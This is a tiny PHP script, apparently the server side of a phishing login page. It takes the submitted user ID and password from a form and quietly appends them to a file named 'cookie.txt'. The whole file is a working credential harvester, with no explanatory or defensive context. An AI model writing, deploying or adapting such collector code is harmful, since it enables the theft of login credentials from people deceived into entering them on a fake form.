<?php
  $a=$_POST["id"];
  $b=$_POST["pw"];

  $f=fopen("cookie.txt", "a+");
  fwrite($f, $a.":".$b);
  fclose($f);
?>
